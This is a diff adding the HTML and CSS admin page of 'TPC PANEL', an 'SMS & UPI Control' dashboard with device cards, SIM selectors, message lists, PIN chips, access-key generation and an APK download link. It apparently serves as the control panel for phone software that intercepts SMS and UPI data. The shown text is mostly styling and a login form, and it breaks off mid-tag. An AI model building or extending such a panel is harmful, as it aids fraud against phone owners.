@@ -131,3 +131,2693 @@ Code-Ivan/
 ├── requirements.txt               [REVIEW]
 ├── Procfile                        [REVIEW]
 └── README.md                       [UPDATE]
+
+
+
+admin/index.html
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TPC PANEL</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+--bg:#04060d;--panel:#0a1120;--border:#172640;--border-hi:#1f4a7d;
+--text:#e6f0ff;--muted:#6b83ab;--dim:#3d5580;
+--neon:#22d3ee;--violet:#a78bfa;--red:#ff5c7a;--amber:#fbbf24;--green:#34d399;
+--radius:16px;--font:"Outfit",system-ui,sans-serif;--mono:"JetBrains Mono",monospace;
+}
+*{box-sizing:border-box}
+[hidden]{display:none!important}
+body{margin:0;min-height:100vh;color:var(--text);font-family:var(--font);font-size:14px;
+-webkit-font-smoothing:antialiased;
+background:radial-gradient(ellipse 900px 520px at 12% -8%,#1e3a8a42,transparent 62%),
+radial-gradient(ellipse 760px 500px at 96% 6%,#7c3aed24,transparent 62%),var(--bg)}
+body::after{content:"";position:fixed;inset:0;z-index:2;pointer-events:none;
+background:radial-gradient(ellipse at center,transparent 52%,#01030ac9 100%)}
+.layer{position:relative;z-index:3}
+button,input,textarea,select{font:inherit}
+button{cursor:pointer}
+a{color:var(--neon);text-decoration:none}
+a:hover{text-shadow:0 0 10px #22d3ee88}
+.muted{color:var(--muted)}.small{font-size:12px}.mono{font-family:var(--mono)}
+.upper{text-transform:uppercase;letter-spacing:1.5px}.w100{width:100%}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-track{background:#060b16}
+::-webkit-scrollbar-thumb{background:#1c3a6b;border-radius:6px}
+::-webkit-scrollbar-thumb:hover{background:var(--neon)}
+::selection{background:var(--neon);color:#001521}
+mark{background:#22d3ee4d;color:#eaf6ff;border-radius:3px;padding:0 2px}
+
+.cat{width:46px;height:46px;flex:0 0 auto;filter:drop-shadow(0 0 12px #8b5cf655)}
+.cat .eye{transform-origin:center;animation:blink 4.6s infinite}
+.cat .ear-l{transform-origin:20px 18px;animation:twitch 5s infinite}
+.cat .ear-r{transform-origin:44px 18px;animation:twitch 5s infinite .4s}
+@keyframes blink{0%,90%,100%{transform:scaleY(1)}94%,97%{transform:scaleY(.08)}}
+@keyframes twitch{0%,86%,100%{transform:rotate(0)}91%{transform:rotate(-7deg)}96%{transform:rotate(5deg)}}
+
+.panel{position:relative;background:linear-gradient(160deg,#0a1226,#060b18);
+border:1px solid var(--border);border-radius:var(--radius);
+box-shadow:0 0 0 1px #38bdf80f,0 18px 50px #000000a6,inset 0 1px 0 #ffffff08}
+.panel::before{content:"";position:absolute;inset:-1px;border-radius:inherit;padding:1px;
+background:linear-gradient(135deg,#22d3ee44,transparent 42%,#8b5cf644);
+-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+
+.login{min-height:100vh;display:grid;place-items:center;padding:24px}
+.login-card{width:100%;max-width:430px;padding:32px;border-radius:22px;
+background:linear-gradient(160deg,#0a1226,#050a18);border:1px solid var(--border);
+box-shadow:0 0 0 1px #38bdf81a,0 30px 90px #000000b3,0 0 80px #1e3a8a2e}
+.brand{display:flex;align-items:center;gap:13px}
+.brand h1{margin:0;font-size:21px;font-weight:800;letter-spacing:2.4px;
+background:linear-gradient(100deg,#22d3ee,#a78bfa 60%,#38bdf8);
+-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand p{margin:3px 0 0;font-size:11px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase}
+.login-card h2{font-size:19px;margin:24px 0 6px}
+.login-card>p{color:var(--muted);font-size:13px;margin:0 0 18px;line-height:1.6}
+label{display:block;color:#a8c2ea;font-size:11px;letter-spacing:1.3px;text-transform:uppercase;margin:15px 0 7px}
+input,textarea,select{width:100%;padding:12px 13px;color:var(--text);background:#04091a;
+border:1px solid var(--border);border-radius:10px;outline:none;transition:.15s}
+textarea{resize:vertical;min-height:84px;font-size:13px}
+input::placeholder,textarea::placeholder{color:#35507e}
+input:focus,textarea:focus,select:focus{border-color:var(--neon);box-shadow:0 0 0 3px #22d3ee1f,0 0 22px #22d3ee26}
+.chk{display:flex;align-items:center;gap:9px;margin:16px 0 0;font-size:12px;text-transform:none;letter-spacing:0;color:var(--muted);font-weight:500}
+.chk input{width:auto;accent-color:var(--neon)}
+.keyinput{font-family:var(--mono);font-size:16px;letter-spacing:2.5px;text-transform:uppercase;text-align:center}
+
+.btn{border:1px solid transparent;border-radius:10px;padding:11px 16px;font-weight:700;font-size:13px;letter-spacing:.6px;transition:.15s}
+.btn.primary{color:#001521;background:linear-gradient(100deg,#22d3ee,#38bdf8);box-shadow:0 0 24px #22d3ee4d}
+.btn.primary:hover{box-shadow:0 0 34px #22d3ee80;transform:translateY(-1px)}
+.btn.ghost{color:var(--neon);background:#22d3ee0f;border-color:#22d3ee33}
+.btn.ghost:hover{background:#22d3ee1f;border-color:var(--neon)}
+.btn.plain{color:var(--muted);background:transparent;border-color:var(--border)}
+.btn.plain:hover{color:var(--text);border-color:var(--border-hi)}
+.btn.danger{color:#ffc9d4;background:#ff5c7a14;border-color:#ff5c7a35}
+.btn.danger:hover{background:#ff5c7a26}
+.btn.on{color:#001521;background:linear-gradient(100deg,#22d3ee,#38bdf8);border-color:transparent}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.login-submit{width:100%;margin-top:20px;padding:13px}
+.msg{margin-top:13px;font-size:12.5px;min-height:16px}
+.msg.err{color:var(--red)}.msg.ok{color:var(--green)}
+.login-foot{margin-top:20px;padding-top:15px;border-top:1px solid var(--border);
+display:flex;justify-content:space-between;align-items:center;gap:10px;font-size:11px;color:var(--muted);letter-spacing:1px;flex-wrap:wrap}
+.howto{margin-top:16px;padding:12px 14px;border-radius:11px;background:#22d3ee0a;
+border:1px solid #22d3ee26;border-left:3px solid var(--neon);font-size:12px;color:#9fc4e6;line-height:1.75}
+.howto b{color:var(--neon)}
+
+.topbar{position:sticky;top:0;z-index:10;display:flex;justify-content:space-between;
+align-items:center;gap:16px;padding:12px 22px;background:#04060de6;
+backdrop-filter:blur(14px);border-bottom:1px solid var(--border)}
+.top-right{display:flex;align-items:center;gap:10px}
+.pill{display:inline-flex;align-items:center;gap:7px;border:1px solid var(--border);
+border-radius:999px;padding:7px 12px;font-size:11px;color:var(--muted);letter-spacing:.8px}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--neon);box-shadow:0 0 10px var(--neon);animation:pulse 2s infinite}
+@keyframes pulse{50%{opacity:.3}}
+.tg{display:grid;place-items:center;width:38px;height:38px;border-radius:50%;
+color:#7fd8ff;background:#229ed917;border:1px solid #229ed940;transition:.15s}
+.tg:hover{color:#fff;background:#229ed9;border-color:#229ed9;box-shadow:0 0 24px #229ed966}
+.apk{display:inline-flex;align-items:center;gap:8px;height:38px;padding:0 14px;border-radius:999px;
+color:#c8f7d4;background:#34d39915;border:1px solid #34d39945;font-size:12px;font-weight:800;
+letter-spacing:1px;transition:.15s}
+.apk:hover{color:#001b10;background:#34d399;border-color:#34d399;box-shadow:0 0 26px #34d39966;text-shadow:none}
+.apk svg{flex:0 0 auto}
+
+.layout{display:grid;grid-template-columns:216px minmax(0,1fr);min-height:calc(100vh - 63px)}
+.side{padding:20px 12px;border-right:1px solid var(--border);background:linear-gradient(180deg,#060b18,#04060d)}
+.side-label{padding:0 10px;margin:0 0 10px;color:#35507e;font-size:10px;font-weight:800;letter-spacing:1.8px;text-transform:uppercase}
+.nav{display:flex;align-items:center;gap:10px;width:100%;padding:11px;margin-bottom:4px;
+text-align:left;color:var(--muted);background:transparent;border:1px solid transparent;
+border-radius:10px;font-size:13px;font-weight:500;transition:.14s}
+.nav:hover{color:var(--text);background:#22d3ee0a}
+.nav.on{color:var(--neon);background:linear-gradient(90deg,#22d3ee1f,#22d3ee08);
+border-color:#22d3ee35;box-shadow:inset 3px 0 0 var(--neon),0 0 22px #22d3ee1f}
+.nav i{width:18px;text-align:center;font-style:normal;font-size:13px}
+.side-foot{margin:26px 8px 0;padding-top:16px;border-top:1px solid var(--border);color:#35507e;font-size:11px;line-height:1.9}
+main{width:100%;max-width:1600px;padding:26px;margin:0 auto;min-width:0}
+.head{display:flex;justify-content:space-between;align-items:flex-start;gap:18px;margin-bottom:22px;flex-wrap:wrap}
+.head h2{margin:0 0 6px;font-size:clamp(21px,2.6vw,27px);font-weight:800;letter-spacing:-.4px;
+background:linear-gradient(100deg,#e8f4ff,#7dd3fc);-webkit-background-clip:text;background-clip:text;color:transparent}
+.head p{margin:0;color:var(--muted);font-size:13px}
+
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:16px;margin-bottom:22px}
+.stat{padding:19px;min-width:0}
+.stat-top{display:flex;align-items:center;justify-content:space-between;gap:10px}
+.stat-label{color:var(--muted);font-size:11px;letter-spacing:1.4px;text-transform:uppercase;font-weight:600}
+.stat-icon{display:grid;place-items:center;width:32px;height:32px;border-radius:9px;
+background:#22d3ee14;border:1px solid #22d3ee2e;color:var(--neon);font-size:14px}
+.stat-val{margin-top:15px;font-size:32px;font-weight:800;letter-spacing:-1px;color:#eaf6ff;text-shadow:0 0 26px #22d3ee4d;overflow-wrap:anywhere}
+.stat-val.neon{color:var(--neon)}.stat-val.green{color:var(--green);text-shadow:0 0 30px #34d3994d}
+.stat-val.red{color:var(--red);text-shadow:0 0 30px #ff5c7a4d}
+.stat-val.violet{color:#c4b5fd;text-shadow:0 0 30px #8b5cf666}
+.stat-foot{margin-top:6px;color:#35507e;font-size:11.5px}
+
+.grid2{display:grid;grid-template-columns:minmax(0,1.4fr) minmax(280px,.8fr);gap:18px}
+.panel-box{min-width:0;overflow:hidden;margin-bottom:18px}
+.panel-head{display:flex;justify-content:space-between;align-items:center;gap:12px;
+padding:15px 18px;border-bottom:1px solid var(--border);background:#0d1730a6}
+.panel-head h3{margin:0;font-size:13.5px;font-weight:700;letter-spacing:.3px}
+.panel-body{padding:16px 18px}
+.row{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:12px 0;border-bottom:1px solid #0f1e3d}
+.row:last-child{border-bottom:0}
+.row-name{font-size:13px;font-weight:600}
+.row-desc{margin-top:3px;font-size:11.5px;color:var(--muted);overflow-wrap:anywhere}
+
+.badge{display:inline-flex;align-items:center;gap:5px;padding:5px 10px;border-radius:999px;
+background:#ffffff0a;border:1px solid var(--border);color:var(--muted);
+font-size:11px;font-weight:600;letter-spacing:.4px;white-space:nowrap}
+.badge.ok{color:var(--neon);border-color:#22d3ee35;background:#22d3ee12;box-shadow:0 0 14px #22d3ee1f}
+.badge.warn{color:var(--amber);border-color:#fbbf2435;background:#fbbf2412}
+.badge.bad{color:var(--red);border-color:#ff5c7a35;background:#ff5c7a12}
+.badge.in{color:var(--violet);border-color:#8b5cf635;background:#8b5cf612}
+.badge.out{color:#38bdf8;border-color:#38bdf835;background:#38bdf812}
+.badge.pin{color:#c4b5fd;border-color:#8b5cf640;background:#8b5cf614}
+.badge.id{color:#7dd3fc;border-color:#38bdf833;background:#38bdf80f}
+.badge.auto{color:var(--green);border-color:#34d39940;background:#34d39912}
+.badge.sim{color:#7dd3fc;border-color:#38bdf833;background:#38bdf810}
+.badge.key{color:#fde68a;border-color:#fbbf2433;background:#fbbf240f;font-family:var(--mono);letter-spacing:1px}
+
+.table-wrap{width:100%;overflow-x:auto}
+table{width:100%;border-collapse:collapse;text-align:left;font-size:13px}
+th,td{padding:12px 16px;border-bottom:1px solid #0f1e3d;white-space:nowrap}
+th{color:var(--muted);font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;background:#0a1226}
+td{color:#bcd4f5}
+tbody tr:hover td{background:#22d3ee08}
+tbody tr:last-child td{border-bottom:0}
+.sub{display:block;margin-top:4px;color:#35507e;font-size:11px}
+.body-cell{max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+display:block;font-family:var(--mono);font-size:12px}
+.pin-chip{display:inline-block;margin-top:5px;padding:2px 8px;border-radius:6px;
+font-family:var(--mono);font-size:11px;font-weight:700;color:#c4b5fd;background:#8b5cf614;border:1px solid #8b5cf630}
+.mini{padding:7px 12px;font-size:11.5px;font-weight:700;color:var(--neon);
+background:#22d3ee12;border:1px solid #22d3ee30;border-radius:8px}
+.mini:hover{background:#22d3ee22;border-color:var(--neon)}
+.mini.v{color:#c4b5fd;background:#8b5cf612;border-color:#8b5cf630}
+.mini.v:hover{background:#8b5cf622;border-color:var(--violet)}
+.mini.d{color:#ffc9d4;background:#ff5c7a12;border-color:#ff5c7a30}
+.mini.d:hover{background:#ff5c7a26;border-color:var(--red)}
+.mini.g{color:var(--green);background:#34d39912;border-color:#34d39930}
+.mini.g:hover{background:#34d39922;border-color:var(--green)}
+.empty{padding:34px 16px;text-align:center;color:#35507e;font-size:13px}
+.notice{margin-bottom:18px;padding:12px 15px;border-radius:10px;background:#22d3ee0f;
+border:1px solid #22d3ee30;border-left:3px solid var(--neon);color:#b6d9f5;font-size:13px}
+.notice.bad{background:#ff5c7a0f;border-color:#ff5c7a33;border-left-color:var(--red);color:#ffd0da}
+.page{display:none}.page.on{display:block}
+.settings-row{padding:14px 0;border-bottom:1px solid #0f1e3d}
+.settings-row:last-child{border-bottom:0}
+.settings-row strong{display:block;margin-bottom:5px;font-size:12.5px;color:#38bdf8}
+.settings-row p{margin:0;color:var(--muted);font-size:12.5px;line-height:1.7;overflow-wrap:anywhere}
+.foot{padding:18px 0 4px;text-align:center;color:#35507e;font-size:11.5px}
+.toast{position:fixed;right:20px;bottom:20px;z-index:70;max-width:calc(100vw - 40px);
+padding:13px 17px;border:1px solid #22d3ee35;border-left:3px solid var(--neon);
+border-radius:11px;background:#071026;color:#d5ecff;box-shadow:0 14px 44px #000a,0 0 26px #22d3ee26;font-size:13px}
+
+.bulk{display:grid;grid-template-columns:minmax(0,1fr) 230px auto;gap:12px;align-items:start;padding:16px}
+.bulk-actions{display:flex;flex-direction:column;gap:8px}
+.toolbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.toolbar input{width:230px}
+
+/* ---------- SIM chips ---------- */
+.simchips{display:flex;gap:8px;flex-wrap:wrap;margin-top:6px}
+.simchip{display:inline-flex;align-items:center;gap:8px;padding:9px 13px;border-radius:11px;
+border:1px solid var(--border);background:#04091a;color:var(--muted);
+font-size:12px;font-weight:700;letter-spacing:.5px;transition:.14s}
+.simchip:hover{border-color:var(--border-hi);color:var(--text)}
+.simchip svg{flex:0 0 auto;opacity:.85}
+.simchip .sc-sub{display:block;font-size:9.5px;font-weight:600;letter-spacing:.3px;
+color:#35507e;margin-top:2px;text-transform:none}
+.simchip.on{color:#001521;background:linear-gradient(100deg,#22d3ee,#38bdf8);
+border-color:transparent;box-shadow:0 0 20px #22d3ee40}
+.simchip.on .sc-sub{color:#00384a}
+.simchip.on svg{opacity:1}
+
+.dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px}
+.dev-card{padding:16px;display:flex;flex-direction:column;gap:12px;cursor:pointer;text-align:left;
+transition:transform .16s,border-color .16s,box-shadow .16s}
+.dev-card:hover,.dev-card:focus-visible{transform:translateY(-3px);border-color:var(--border-hi);
+box-shadow:0 0 0 1px #38bdf833,0 20px 48px #000c,0 0 42px #22d3ee26;outline:none}
+.dev-top{display:flex;align-items:center;gap:12px}
+.phone{display:grid;place-items:center;width:46px;height:46px;flex:0 0 auto;border-radius:13px;color:var(--neon);
+background:linear-gradient(150deg,#22d3ee1f,#8b5cf614);border:1px solid #22d3ee2e;box-shadow:inset 0 1px 0 #ffffff0f}
+.dev-name{font-size:14px;font-weight:700;overflow-wrap:anywhere}
+.dev-sub{margin-top:3px;color:var(--muted);font-size:11.5px}
+.dev-meta{display:flex;flex-wrap:wrap;gap:7px;align-items:center}
+.dev-foot{display:flex;align-items:center;justify-content:space-between;gap:10px;
+padding-top:11px;border-top:1px solid #0f1e3d;color:#35507e;font-size:11.5px}
+.open-hint{color:var(--neon);font-weight:700;font-size:11.5px;letter-spacing:.5px}
+
+.batt{display:inline-flex;align-items:center;gap:7px}
+.batt-shell{position:relative;width:42px;height:19px;border:1.6px solid var(--border-hi);border-radius:5px;padding:2px}
+.batt-shell::after{content:"";position:absolute;right:-5px;top:50%;transform:translateY(-50%);
+width:3px;height:9px;background:var(--border-hi);border-radius:0 2px 2px 0}
+.batt-fill{height:100%;border-radius:2px;background:var(--green);transition:width .3s}
+.batt-fill.low{background:var(--red)}
+.batt-fill.mid{background:var(--amber)}
+.batt-label{font-family:var(--mono);font-size:12px;color:#bcd4f5}
+
+/* ---------- overlay : sirf msg list scroll ---------- */
+.overlay{position:fixed;inset:0;z-index:45;padding:20px;background:#01030af2;
+backdrop-filter:blur(6px);display:flex;flex-direction:column;overflow:hidden}
+.shell{width:100%;max-width:1220px;margin:0 auto;flex:1;min-height:0;display:flex;flex-direction:column}
+.detail-head{display:flex;align-items:center;justify-content:space-between;gap:16px;
+flex-wrap:wrap;padding:15px 18px;margin-bottom:14px;flex:0 0 auto}
+.detail-id{display:flex;align-items:center;gap:13px;min-width:0}
+.detail-name{font-size:17px;font-weight:800;overflow-wrap:anywhere}
+.detail-sub{margin-top:4px;color:var(--muted);font-size:12px}
+.detail-tags{display:flex;gap:7px;flex-wrap:wrap;margin-top:8px}
+.detail-actions{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.banner{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;
+margin-bottom:14px;padding:12px 15px;border-radius:11px;font-size:13px;flex:0 0 auto;
+background:#fbbf240f;border:1px solid #fbbf2433;border-left:3px solid var(--amber);color:#fde6b0}
+.banner.bad{background:#ff5c7a0f;border-color:#ff5c7a33;border-left-color:var(--red);color:#ffd0da}
+.detail-grid{flex:1;min-height:0;display:grid;grid-template-columns:370px minmax(0,1fr);
+gap:18px;align-items:stretch;overflow:hidden}
+.detail-grid>.col{min-width:0;min-height:0;overflow-y:auto;padding-right:6px;
+display:flex;flex-direction:column;gap:18px}
+.detail-grid>.col>.panel-box{margin-bottom:0}
+.detail-grid>section.panel-box{min-height:0;display:flex;flex-direction:column;overflow:hidden;margin-bottom:0}
+.detail-grid>section.panel-box>.panel-head,
+.detail-grid>section.panel-box>.searchbar{flex:0 0 auto}
+
+.num-row{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:12px 0;border-bottom:1px solid #0f1e3d}
+.num-row:last-child{border-bottom:0}
+.num-label{font-size:10.5px;letter-spacing:1.3px;text-transform:uppercase;color:#35507e;font-weight:700}
+.num-val{margin-top:5px;font-family:var(--mono);font-size:16px;font-weight:700;color:#eaf6ff;overflow-wrap:anywhere}
+.num-val.empty{color:#35507e;font-weight:500;font-size:13px}
+.spec-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(112px,1fr));gap:10px}
+.spec{padding:10px 11px;border:1px solid var(--border);border-radius:10px;background:linear-gradient(160deg,#0a1226,#070d1c)}
+.spec-k{font-size:9.5px;letter-spacing:1.3px;text-transform:uppercase;color:#35507e;font-weight:700}
+.spec-v{margin-top:6px;font-size:13px;font-weight:700;color:#e3f1ff;overflow-wrap:anywhere;font-family:var(--mono)}
+.more-grid{display:grid;grid-template-columns:1fr 1fr;gap:0 18px}
+.more-row{display:flex;justify-content:space-between;gap:12px;padding:8px 0;border-bottom:1px solid #0f1e3d;font-size:12.5px}
+.more-row span:first-child{color:var(--muted)}
+.more-row span:last-child{font-family:var(--mono);text-align:right;overflow-wrap:anywhere}
+.out-item{display:flex;align-items:center;gap:9px;padding:9px 0;border-bottom:1px solid #0f1e3d;font-size:12px}
+.out-item:last-child{border-bottom:0}
+.out-body{flex:1;min-width:0;font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#bcd4f5}
+.out-time{color:#35507e;font-size:10.5px}
+.searchbar{display:flex;gap:10px;flex-wrap:wrap;align-items:center;padding:12px 16px;
+border-bottom:1px solid var(--border);background:#0a1226}
+.searchbar input{flex:1 1 200px;min-width:150px}
+.searchbar select{width:auto}
+.searchbar .lbl{gap:7px;cursor:pointer;margin:0;text-transform:none;letter-spacing:.4px}
+.searchbar input[type=checkbox]{width:auto}
+.msg-list{flex:1;min-height:0;overflow-y:auto;max-height:none}
+.msg{padding:13px 16px;border-bottom:1px solid #0f1e3d}
+.msg:last-child{border-bottom:0}
+.msg:hover{background:#22d3ee08}
+.msg-head{display:flex;align-items:center;gap:9px;flex-wrap:wrap;margin-bottom:7px;font-size:11.5px}
+.msg-addr{font-family:var(--mono);color:#bcd4f5}
+.msg-time{margin-left:auto;color:#35507e;font-size:11px}
+.msg-body{font-family:var(--mono);font-size:12.5px;color:#d5e7ff;white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.65}
+.msg-foot{margin-top:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.field-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.pre-out{margin:12px 0 0;padding:12px;border:1px solid var(--border);border-radius:10px;
+background:#04091a;font-family:var(--mono);font-size:12px;color:var(--muted);
+white-space:pre-wrap;overflow-wrap:anywhere;min-height:18px}
+.divider{display:flex;align-items:center;gap:12px;margin:26px 0 16px;color:#35507e;
+font-size:10.5px;font-weight:800;letter-spacing:1.8px;text-transform:uppercase}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border)}
+
+.act-wrap{position:relative}
+.act-menu{position:absolute;top:calc(100% + 8px);right:0;z-index:60;min-width:196px;padding:6px;
+border-radius:12px;background:#0a1226;border:1px solid var(--border-hi);
+box-shadow:0 18px 44px #000c,0 0 30px #22d3ee14}
+.act-menu button{display:flex;align-items:center;gap:9px;width:100%;padding:9px 11px;border:0;
+border-radius:8px;background:transparent;color:#bcd4f5;font-size:12.5px;font-weight:600;text-align:left}
+.act-menu button:hover{background:#22d3ee14;color:#fff}
+
+.switch{position:relative;width:46px;height:26px;flex:0 0 auto;border-radius:999px;
+border:1px solid var(--border-hi);background:#0d1628;transition:.2s}
+.switch::after{content:"";position:absolute;top:2px;left:2px;width:20px;height:20px;
+border-radius:50%;background:#4b6489;transition:.2s}
+.switch.on{background:#34d39926;border-color:#34d39980}
+.switch.on::after{left:22px;background:var(--green);box-shadow:0 0 14px #34d399a6}
+
+.as-panel{border-color:#22d3ee33}
+.as-head{display:flex;align-items:center;gap:12px;padding:14px 18px;background:#0d1730a6;border-bottom:1px solid var(--border)}
+.as-ico{display:grid;place-items:center;width:38px;height:38px;flex:0 0 auto;border-radius:11px;
+font-size:17px;background:#22d3ee14;border:1px solid #22d3ee33}
+.as-title{display:flex;align-items:center;gap:9px;font-size:13.5px;font-weight:700}
+.as-sub{margin-top:2px;font-size:11.5px;color:var(--muted)}
+.as-body{padding:16px 18px}
+.step{border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:12px;background:#0a1226}
+.step-tag{display:inline-block;font-size:10px;font-weight:800;letter-spacing:1.4px;color:var(--neon);
+background:#22d3ee14;border:1px solid #22d3ee33;border-radius:6px;padding:3px 8px}
+.step-desc{margin:10px 0 12px;font-size:13px;color:#bcd4f5}
+.copy-row{display:flex;align-items:center;justify-content:space-between;gap:10px;
+padding:9px 12px;border:1px dashed var(--border-hi);border-radius:10px;background:#04091a}
+.copy-row .mono{font-size:13px;color:var(--neon)}
+.inline{display:flex;gap:9px;align-items:center}
+.inline input{flex:1}
+.hint{margin:9px 0 12px;font-size:11.5px;color:#35507e}
+.ok-msg{display:flex;align-items:center;gap:8px;margin:9px 0;padding:9px 11px;border-radius:9px;
+font-size:12.5px;color:var(--green);background:#34d39914;border:1px solid #34d39933}
+.ok-msg.bad{color:#ffd0da;background:#ff5c7a14;border-color:#ff5c7a33}
+.status-panel{margin:12px 0;padding:11px 13px;border-radius:10px;font-size:12.5px;color:var(--green);
+background:#34d39912;border:1px solid #34d39933;border-left:3px solid var(--green)}
+.status-panel.off{color:var(--muted);background:#ffffff05;border-color:var(--border);border-left-color:var(--dim)}
+.status-panel .mono{color:#a7f3d0}
+.toggle-row{display:flex;align-items:center;justify-content:space-between;gap:12px;
+padding:11px 0;border-bottom:1px solid #0f1e3d}
+.toggle-row:last-of-type{border-bottom:0}
+.toggle-row .t-name{font-size:13px;font-weight:600}
+.toggle-row .t-desc{margin-top:3px;font-size:11.5px;color:var(--muted)}
+.u-actions{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+.u-actions input[type=date]{width:150px;padding:7px 9px;font-size:12px;font-family:var(--mono)}
+.keygen{display:grid;grid-template-columns:1.2fr 1fr 150px auto;gap:12px;align-items:end;padding:16px}
+.keyout{margin-top:14px;padding:14px;border-radius:12px;background:#0a1226;
+border:1px dashed #fbbf2455;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.keyout .k{font-family:var(--mono);font-size:20px;font-weight:800;letter-spacing:3px;color:#fde68a;
+text-shadow:0 0 20px #fbbf2440;overflow-wrap:anywhere}
+
+.bar{height:8px;border-radius:999px;background:#0f1e3d;overflow:hidden;margin-top:10px}
+.bar>span{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,#22d3ee,#38bdf8)}
+.bar.red>span{background:linear-gradient(90deg,#ff5c7a,#fbbf24)}
+
+@media (max-width:1100px){
+.stats{grid-template-columns:repeat(2,minmax(0,1fr))}
+.grid2{grid-template-columns:1fr}
+.bulk,.keygen{grid-template-columns:1fr}
+.overlay{display:block;overflow-y:auto}
+.shell{display:block;min-height:100%}
+.detail-grid{display:block;overflow:visible}
+.detail-grid>.col{overflow:visible;display:block}
+.detail-grid>.col>.panel-box{margin-bottom:18px}
+.detail-grid>section.panel-box{display:block;overflow:visible;margin-bottom:18px}
+.msg-list{max-height:70vh;overflow-y:auto}
+}
+@media (max-width:760px){
+.topbar{padding:11px 14px}
+.topbar .brand p{display:none}
+.pill{display:none}
+.apk span{display:none}
+.apk{width:38px;padding:0;justify-content:center}
+.layout{grid-template-columns:1fr}
+.side{display:flex;gap:6px;padding:9px;overflow-x:auto;border-right:0;border-bottom:1px solid var(--border)}
+.side-label,.side-foot{display:none}
+.nav{width:auto;flex:0 0 auto;margin:0;padding:9px 12px;font-size:12px}
+.nav i{display:none}
+main{padding:18px 13px}
+.stat{padding:14px}
+.stat-val{font-size:24px}
+.panel-head,.panel-body{padding:14px}
+.field-row,.more-grid{grid-template-columns:1fr}
+.dev-grid{grid-template-columns:1fr}
+.toolbar input{width:100%}
+.overlay{padding:12px}
+}
+@media (max-width:380px){
+.stats{grid-template-columns:1fr}
+.brand h1{font-size:16px}
+}
+</style>
+</head>
+<body>
+<div class="layer">
+
+<section class="login" id="loginScreen">
+<div class="login-card">
+<div class="brand">
+<svg class="cat" viewBox="0 0 64 64" aria-hidden="true">
+<defs>
+<linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
+<stop offset="0%" stop-color="#a855f7"/><stop offset="55%" stop-color="#6366f1"/><stop offset="100%" stop-color="#1e3a8a"/>
+</linearGradient>
+</defs>
+<path class="ear-l" d="M13 24 L9 5 L26 15 Z" fill="url(#g1)"/>
+<path class="ear-r" d="M51 24 L55 5 L38 15 Z" fill="url(#g1)"/>
+<ellipse cx="32" cy="37" rx="22" ry="19" fill="url(#g1)"/>
+<ellipse class="eye" cx="24" cy="34" rx="4.6" ry="6" fill="#000"/>
+<ellipse class="eye" cx="40" cy="34" rx="4.6" ry="6" fill="#000"/>
+<path d="M32 42 l-2.6 3 h5.2 z" fill="#0b1030"/>
+<path d="M6 40 L20 43 M6 47 L20 47" stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
+<path d="M58 40 L44 43 M58 47 L44 47" stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
+</svg>
+<div>
+<h1>TPC PANEL</h1>
+<p>SMS &amp; UPI Control</p>
+</div>
+</div>
+
+<h2>Sign in</h2>
+<p>Admin apne login se aata hai. User admin se mili <b>access key</b> daalta hai.</p>
+
+<form id="loginForm">
+<label for="username">Login ID / Access key</label>
+<input id="username" autocomplete="username" placeholder="admin id  ya  TPC-XXXX-XXXX-XXXX" required>
+<label for="password">Password <span class="muted small" style="text-transform:none;letter-spacing:0">(sirf admin ke liye)</span></label>
+<input id="password" type="password" autocomplete="current-password" placeholder="admin password (user chhod de)">
+<label class="chk"><input type="checkbox" id="remember" checked> Keep me signed in on this device</label>
+<button class="btn primary login-submit" id="loginBtn" type="submit">Sign in</button>
+<div class="msg" id="loginMsg" role="status" aria-live="polite"></div>
+</form>
+
+<div class="howto">
+<b>User kaise aayega?</b> Admin → Access keys → <b>Generate</b> dabao → key copy karke user ko bhejo → user wahi key yahan daal ke panel khol lega. Koi register nahi.
+</div>
+
+<div class="login-foot">
+<span>Session persists locally</span>
+<a class="apk" id="apkLogin" href="#" target="_blank" rel="noopener">
